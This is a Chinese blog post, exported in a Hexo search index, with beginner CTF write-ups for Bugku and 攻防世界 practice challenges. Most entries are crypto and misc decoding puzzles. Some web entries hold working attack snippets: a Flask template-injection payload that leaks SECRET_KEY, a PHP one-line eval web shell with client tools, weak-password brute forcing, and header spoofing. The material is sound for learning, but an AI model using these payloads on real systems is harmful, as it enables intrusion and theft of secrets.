<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF 成长之路</title>
    <url>/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="一些题库练习"><a href="#一些题库练习" class="headerlink" title="一些题库练习"></a>一些题库练习</h1><h2 id="Bugku-CTF"><a href="#Bugku-CTF" class="headerlink" title="Bugku CTF"></a>Bugku CTF</h2><p>签到题就不必了哈，公众号关注回复即可拿到 flag ，了解一个基础格式 <code>flag&#123;key&#125;</code></p>
<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><blockquote>
<p>描述：计算正确即可得到flag</p>
</blockquote>
<p>启动场景发现就是一个很简单的html页面，对图片里的算式进行计算： </p>
<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580428948703.jpg" alt="计算器"><br>输入答案发现输入框只能输入一位数字，验证提示输入失败！查看网页代码发现对输入框长度进行了限制，只需要将其改为我们所需要的长度即可成功输入答案通过验证</p>
<h4 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h4><blockquote>
<p>描述: Simple_SSTI_1</p>
</blockquote>
<p>根据描述我们可知应该是 <strong>服务器模版注入</strong> ，启动场景网页提示，“你需要传入一个名为flag的参数”：</p>
<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580432363022.jpg" alt="Simple_SSTI_1"><br>查看网页源代码发现最下端有提示：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580435206034.jpg"></p>
<ul>
<li>flask：是由python实现的一种微web框架   </li>
<li>SECRET_KEY：flask中的一种配置属性，flask涉及安全的东西需要用这个SECRET_KEY密钥进行加密</li>
</ul>
<p>到这里基本上可以确定题目的 flag 就藏在 SECRET_KEY 中，首先测试一下是否能回显，显示成功即表示存在该漏洞：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580436166187.jpg"><br>接下来通过 <code>?flag=&#123;&#123;config&#125;&#125;</code> 看一下哪些全局变量可用，没想到 flag 直接出来了，比较简单<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580436726542.jpg"><br>或者也可以通过在 URL 补充语句 <code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</code> 得到 flag </p>
<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h4><blockquote>
<p>描述: key{}</p>
</blockquote>
<p>根据题目描述我们猜测此题的 flag 格式为 <code>key&#123;&#125;</code> ，题目下载得到一张如下图片：</p>
<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/file.jpg" alt="file"><br>单看图片没发现什么问题，用 HexFiend 或 WinHex等十六进制编辑器打开查看，企图找到 ctf、CTF、flag、key 等关键字，结果发现一串很有意思的编码：</p>
<p><img src="/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF//CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/pichex.png" alt="pichex"><br>通过 <strong>Unicode</strong> 解密可得到 flag </p>
<h4 id="社工-进阶收集"><a href="#社工-进阶收集" class="headerlink" title="社工-进阶收集"></a>社工-进阶收集</h4><blockquote>
<p>提示: flag{小美小区名字拼音}</p>
</blockquote>
<blockquote>
<p>描述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编 难度降低)</p>
</blockquote>
<p>下载题目发现是一张简单说说对话截图，根据图片我们可以得到一些信息：</p>
<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580448564615.jpg"></p>
<ul>
<li>图片内容：西安大雁塔（可通过百度识图找到）</li>
<li>七站地铁到达大雁塔</li>
<li>途中地铁需要转一站</li>
<li>始发地地铁上车，离家800多米</li>
<li>第二站地铁上车，离家1公里多</li>
</ul>
<p>纯纯就是翻看西安地图。。。。 研究地铁路线图不难发现小美应该是在韦曲南地铁站上车，她家就在韦曲南和航天城两个站之间<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580450931943.jpg"><br>打开百度地图看看韦曲南和航天站距离，从韦曲南开始查看800米左右附件的小区，挨个试试：</p>
<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/xiaomei.png" alt="xiaomei"><br>最后发现是兰乔国际城， <code>flag&#123;lanqiaoguojicheng&#125;</code></p>
<h3 id="Cypto"><a href="#Cypto" class="headerlink" title="Cypto"></a>Cypto</h3><h4 id><a href="#" class="headerlink" title="/.-"></a>/.-</h4><blockquote>
<p>描述:<br>..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-</p>
</blockquote>
<p>显而易见这就是 <strong>摩斯密码</strong>，找个网址解密即可得到 flag</p>
<h4 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h4><blockquote>
<p>描述: 一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}</p>
</blockquote>
<p>搜索发现这是 <strong>栅栏密码</strong>，找到工具 <a href="https://ctf.bugku.com/tool/railfence">栅栏加解/密</a> ，输入栏数 <code>2</code> 和密文 <code>fa&#123;fe13f590lg6d46d0d0&#125;</code> 解密即破：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580462553718.jpg"></p>
<h4 id="lt-gt"><a href="#lt-gt" class="headerlink" title="[+-&lt;&gt;]"></a>[+-&lt;&gt;]</h4><blockquote>
<p>描述: +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;—- —-&lt; ]&gt;— —– —.&lt; +++++ ++[-&gt; +++++ ++&lt;]&gt; +++.&lt; +++++ +[-&gt;- —– &lt;]&gt;– —– -.–. —-. –.++ +++++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +.++. &lt;++++ ++[-&gt; —– -&lt;]&gt;- —– —-. -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;+. —-. ++++. &lt;++++ +++[- &gt;—- —&lt;] &gt;—- .+.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</p>
</blockquote>
<p>这什么东西？？？？<br>通过搜索发现它是 <strong>Brainfuck</strong> 语言，找到网站尝试解密 <a href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding</a><br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580466034211.jpg"><br>成功得到 flag 啦～</p>
<h4 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h4><blockquote>
<p>描述: Ook.</p>
</blockquote>
<p>omg 文件下载打开之后发现截图都截不完，全是 <code>Ook</code> 这个字符，不过观察发现标点符号是不一样的，嗯？这里面一定有问题！ 搜索发现竟然还有一种编码就叫做 <strong>Ook</strong> 编码，利用 <a href="https://tool.bugku.com/brainfuck/">编码工具</a> 解码得到 flag </p>
<h4 id="抄错的字符"><a href="#抄错的字符" class="headerlink" title="抄错的字符"></a>抄错的字符</h4><blockquote>
<p>描述: 老师让小明抄写一段话，结果粗心的小明把部分数字抄成了字母，还因为强迫症把所有字母都换成大写。你能帮小明恢复并解开答案吗：QWIHBLGZZXJSXZNVBZW</p>
</blockquote>
<p>题目可知给出的字符串中的每个字符原来可能是大小写字母或数字，那我就直接暴力枚举了，优先级：数字 &gt; 小写字母 &gt; 大写字母，然后将枚举出来的字符进行解密（盲猜 base64 ，通过评论区确认）。随便找到一个 <a href="https://base64.us/">base64解码网站</a> ，将可能抄错的英文字母换成数字，然后切换几个大小写字母（随机），不是乱码但看起来好像也不太对劲？：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/base64string.png" alt="base64string"><br>反复尝试终于找到一个貌似正确的内容（题目作者: Aman）： <code>QW1hbl92ZXJ5X2Nvb2w</code> ，解码得到 <code>Aman_very_cool</code> ，加上 flag 框架即可成功提交答案</p>
<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>知识盲区。。。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>知识盲区➕1</p>
<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><p>这个怎么签到题都不给一个啊 害😮‍💨</p>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h4><blockquote>
<p>描述: X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p>
</blockquote>
<p>打开网页发现无法点击右键 <strong>查看网页源代码</strong> ，于是通过 <code>F12</code> 查看网页源代码找到 flag</p>
<h4 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h4><blockquote>
<p>描述: X老师告诉小宁同学 <strong>HTTP通常使用两种请求方法</strong> ，你知道是哪两种吗？</p>
</blockquote>
<p>根据网页描述通过 <code>get</code> 方法传入参数 <code>a=1</code>， 然后再通过 <code>hackbar</code> 插件或 <code>burpsuite</code> 软件传入参数 <code>b=2</code>，然后执行得到 flag<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580489573238.jpg" alt="16580489573238"></p>
<h4 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h4><blockquote>
<p>描述: X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p>
</blockquote>
<p><strong>Robots协议</strong> 就是爬虫协议，直接访问 <code>robots.txt</code>文件：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580488399367.jpg"><br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580488469803.jpg"><br>发现 flag 所在文件 <code>flag_1s_h3re.php</code>，访问此网页即可得到</p>
<h4 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h4><blockquote>
<p>描述: X老师忘记删除备份文件，他派小宁同学去把备份文件找出来，一起来帮小宁同学吧！</p>
</blockquote>
<p>进入答题网址后，发现是需要找 index.php 的备份文件，搜索发现 <strong>备份文件后缀名</strong> 为 .bak ，访问下载 index.pgp.bak 文件打开发现 flag</p>
<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><blockquote>
<p>描述: X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p>
</blockquote>
<p>进入答题网址后，提示我们查看 cookie ，<code>F12 -&gt; Network -&gt;cookie</code>：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580497234917.jpg"><br>根据提示访问 cookie.php ，页面又提示我们查看 http 响应头，发现 flag ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580497852930.jpg"></p>
<h4 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h4><blockquote>
<p>描述: X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
</blockquote>
<p>又是一个前端限制题目，直接 F12 定位到 flag 处的代码，发现设置了 button 不可点，删除 disabled 回车就可以点击按钮了，然后得到 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580499738618.jpg"></p>
<h4 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h4><blockquote>
<p>描述: 小宁写了一个登陆验证页面，随手就设了一个密码。</p>
</blockquote>
<p>根据题目描述首先想到爆破（还是弱口令），随手一试 <code>admin:123456</code> 就出来了。。。<br>正经步骤：burp 弱口令字典爆破</p>
<h4 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h4><blockquote>
<p>描述: 小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p>
</blockquote>
<p>看题目就是一个简单 php 代码审计的意思，通过 <code>GET</code> 方法得到 <code>a</code> 和 <code>b</code> 的值：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580502749061.jpg"><br>根据代码：<code>b</code>不能是整数或纯数字字符串，且值大于1234，那么我们可以构造个 <code>12345a</code>，于是 payload 构造为 <code>?a==0&amp;b=12345a</code> 回车得到 flag</p>
<h4 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h4><blockquote>
<p>描述: X老师告诉小宁其实xff和referer是可以伪造的。</p>
</blockquote>
<p>根据描述和题目很容易猜到此题就是要构造 <strong>xff</strong> 和 <strong>referer</strong> ，打开第一步就是叫我们伪造 ip 地址，也就是伪造 xff 来，burpsuite 抓包后 Send to Repeater，直接在请求里面添加 <code>X-Forwarded-For: 123.123.123.123</code> ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582004268805.jpg"></p>
<p>这时在 Response 里看到下一步提示 必须来源于 <a href="https://www.google.com/">https://www.google.com</a> ，说明叫我们修改 referer ，和上一步一样的办法，在请求里面添加 <code>Referer: https://www.google.com</code> ，点击发送得到 flag :<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582004458456.jpg"></p>
<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><blockquote>
<p>描述: 小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p>
</blockquote>
<p>根据题意可知是 PHP <strong>一句话木马</strong> ，启动场景可以看到这句话具体内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>这里我们需要用一种 <strong>webshell</strong> 的工具，比如“菜刀”或者是“蚁剑”之类的，具体配置：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582008518924.jpg"><br>连接成功后拿到权限很容易找到 <code>flag.txt</code> 文件：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582009188308.jpg"></p>
<h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h4><blockquote>
<p>描述:<br>Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</p>
</blockquote>
<p>啊！！签到题这不就来了吗？！ 竟然难度 2🌟  。。。</p>
<h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><blockquote>
<p>描述: 菜猫给了菜狗一张图，说图下面什么都没有</p>
</blockquote>
<p>打开图片后发现是 PDF 文件，预览显示和图片无差，尝试转成 word 文档打开，移开图片发现 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582287976918.jpg"></p>
<h4 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h4><blockquote>
<p>描述: 菜狗为了打败菜猫，学了一套如来十三掌。</p>
</blockquote>
<p>附件打开里面是一段看不懂的文字，但是也能看出这应该是一段佛文，立马想到【与佛论禅】（注意格式一定要加上：<code>佛曰：</code>），解密得到<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code> ，但输入发现不是正确 flag ，继续分析题目，联想到 <strong>rot13</strong> ，解码得到<code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code> ，输入依然错误，这时机智的来了一个 base64解密 ，顺利拿下 <code>flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</code></p>
<h4 id="转轮机加密"><a href="#转轮机加密" class="headerlink" title="转轮机加密"></a>转轮机加密</h4><blockquote>
<p>描述:<br>你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊。flag，是字符串，小写。</p>
</blockquote>
<p>题目得到一个重要信息：托马斯·杰斐逊，发现这应该是 <strong>杰斐逊转轮密码</strong> ，没有解密器，就只能自己手动计算了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line">10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line">11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line">12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line">13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：2,3,7,5,13,12,9,1,8,10,4,11,6</span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure>

<p>根据密钥第一个数是 2 ，密文第一个是 N ，选择加密表 <code>2：&lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</code> ，把 N 后面的提前， N 前面的放后面 <code>NACZDTRXMJQOYHGVSFUWIKPBEL</code> ， 其他的类似：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582314749300.jpg"><br>发现倒数第九列的字母可以拼出意思， <code>fireinthehole</code> （这个就是flag了，不用加其他的东西）</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><blockquote>
<p>描述:<br>元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。<br>你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。</p>
</blockquote>
<p>下载附件发现就是一段 base64 编码，找个网站解码即可得到 flag</p>
<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/base64.png" alt="base64"></p>
<h4 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h4><blockquote>
<p>描述:<br>你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p>
</blockquote>
<p>根据题目提示 Caesar 知道是 <strong>凯撒密码</strong>， 搜索找到在线解密网站。根据凯撒原理我们合理猜测 flag 格式为 <code>cyberpeace&#123;&#125;</code> ，计算得到 <code>o</code> 与 <code>c</code> 的差为12（或者挨个尝试1-25），发现位移 12 得到正确 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16581992278104.jpg"></p>
<h4 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h4><blockquote>
<p>描述:<br>小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)</p>
</blockquote>
<p>打开附件发现写着一串二进制字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</span><br></pre></td></tr></table></figure>

<p>根据题目我们知道这是 <strong>摩斯密码</strong> ，但和常规 <code>.-</code> 形式不太一样，找到一个解密网站，根据 <code>. = 0 &amp;&amp; - = 1</code> 将上串二进制字符改为摩斯密码的形式解密得到 flag 内容，再添加个格式框即可</p>
<h4 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h4><blockquote>
<p>描述:<br>被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p>
</blockquote>
<p>题目的翻译是“铁栅栏”，根据提示很容易便能想到分 5 栏的 <strong>栅栏密码</strong>，找到网站设置栏目数为 5 解密即可得到 flag</p>
<h4 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h4><blockquote>
<p>描述:<br>“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}</p>
</blockquote>
<p>首先一串 <code>.-</code> 字符直接 <strong>摩斯密码</strong> 解密：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Morseandpeigen.png" alt="Morseandpeigen"></p>
<p>得到提示 <code>MAY_BE_HAVE_ANOTHER_DECODE</code> ，还有一串 <code>A</code> <code>B</code> 组成的字符，发挥脑子和搜索🔍，发现符合 <strong>培根密码</strong> 形式（也满足描述所说一种食物），解密即可得到flag</p>
<h4 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h4><blockquote>
<p>描述:<br>经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}</p>
</blockquote>
<p>打开附件发现两个等号和数字大小写组合字符，典型的base64编码型，直接转换得到一堆 &amp;# ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582027281003.jpg"></p>
<p>猜测 <strong>Unicode编码</strong> 或 Hex ，又转出一串三位数的像 <strong>ASCII编码</strong> 的东西：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582028335080.jpg"><br>对照 ASCII 码字符表可得到 flag （也可以写个脚本切割识别）</p>
<h4 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h4><blockquote>
<p>描述:<br>你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}</p>
</blockquote>
<p>由题意可知此题为 <strong>幂数加密</strong>，附件里的内容为 <code>8842101220480224404014224202480122</code>，<br>而正常的二进制幂数加密只有 <code>0</code>、<code>1</code>、<code>2</code>、<code>3</code>、<code>4</code>、<code>5</code>，是不会出现 8 的，通过百度了解到这其实是 <strong>云影密码</strong> ，以 0 为分隔符，我们将每个字母的密文相加得推出英文字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8+8+4+2+1=23 --&gt; W</span><br><span class="line">1+2+2=5 --&gt; E</span><br></pre></td></tr></table></figure>

<p>依次计算得到 <code>WELLDONE</code> ，就是所需要的</p>
<h3 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h3><p>还有手机专场啊🤔</p>
<h3 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h3><p>下次一定。</p>
<h3 id="PWN-1"><a href="#PWN-1" class="headerlink" title="PWN"></a>PWN</h3><p>好得很哇^_^</p>
<hr>
<h1 id="一些知识补充"><a href="#一些知识补充" class="headerlink" title="一些知识补充"></a>一些知识补充</h1><h2 id="服务器模版注入-SSTI"><a href="#服务器模版注入-SSTI" class="headerlink" title="服务器模版注入 SSTI"></a>服务器模版注入 SSTI</h2><h2 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h2><h2 id="摩斯密码-Morse"><a href="#摩斯密码-Morse" class="headerlink" title="摩斯密码 Morse"></a>摩斯密码 Morse</h2><h2 id="Brainfuck-Ook-语言"><a href="#Brainfuck-Ook-语言" class="headerlink" title="Brainfuck/Ook! 语言"></a>Brainfuck/Ook! 语言</h2><h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码"></a>查看网页源代码</h2><p>三种方式：</p>
<ul>
<li>右键，选择查看网页源代码</li>
<li>F12，选择elements</li>
<li>网页地址栏前面加上 <code>view-source:</code></li>
</ul>
<h2 id="HTTP两种请求方法"><a href="#HTTP两种请求方法" class="headerlink" title="HTTP两种请求方法"></a>HTTP两种请求方法</h2><ul>
<li>GET: 在 URL 后添加参数 <code>?/变量名=值</code></li>
<li>POST: 打开 HackBar ，选择 post data，在下面文本框内输入参数 <code>变量名=值</code></li>
</ul>
<h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h2><p>Robots 协议也称爬虫协议、爬虫规则等，是指网站可建立一个 <code>robots.txt</code> 文件来告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取 <code>robots.txt</code> 文件来识别这个页面是否允许被抓取。</p>
<h2 id="xff-and-referer"><a href="#xff-and-referer" class="headerlink" title="xff and referer"></a>xff and referer</h2><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h2 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell"></a>webshell</h2><h2 id="备份文件后缀名"><a href="#备份文件后缀名" class="headerlink" title="备份文件后缀名"></a>备份文件后缀名</h2><p>常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” </p>
<h2 id="凯撒密码-Caesar"><a href="#凯撒密码-Caesar" class="headerlink" title="凯撒密码 Caesar"></a>凯撒密码 Caesar</h2><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><p>培根密码只包含了两种不同的字符’A’和’B’，转换规则如下：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582025319658.jpg"></p>
